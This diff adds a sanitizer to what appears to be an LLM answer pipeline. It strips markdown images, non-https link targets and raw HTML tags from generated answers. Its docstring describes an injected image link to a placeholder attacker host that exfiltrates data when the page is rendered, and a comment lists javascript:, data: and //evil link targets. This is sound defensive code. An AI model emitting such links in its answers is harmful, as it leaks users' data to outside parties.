@@ -64,6 +64,21 @@ def unknown_urls(answer: str, source_urls: set[str]) -> list[str]:
     return [u for u in cited_urls(answer) if u.rstrip("/") not in known]
 
 
+_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
+_MD_BAD_LINK = re.compile(r"\]\(\s*(?!https://)[^)]*\)", re.I)          # [x](javascript:..) / (//evil) / (data:..)
+_HTML_TAG = re.compile(r"<\s*/?\s*(img|a|iframe|script|style|svg|object|embed|form|link|meta)\b[^>]*>", re.I)
+
+
+def strip_active_markup(answer: str) -> tuple[str, int]:
+    """Remove markdown images, non-https link targets and raw HTML tags. An image URL is fetched by the user's
+    browser on render, so an injected `![](https://attacker/?q=...)` would leak data without a click."""
+    n = 0
+    for rx, rep in ((_MD_IMAGE, ""), (_MD_BAD_LINK, "]"), (_HTML_TAG, "")):
+        answer, k = rx.subn(rep, answer)
+        n += k
+    return answer, n
+
+
 def strip_unknown_urls(answer: str, source_urls: set[str]) -> tuple[str, list[str]]:
     """Remove links the tools never returned (hallucinated or injected, e.g. phishing). Returns (answer, removed)."""
     bad = unknown_urls(answer, source_urls)
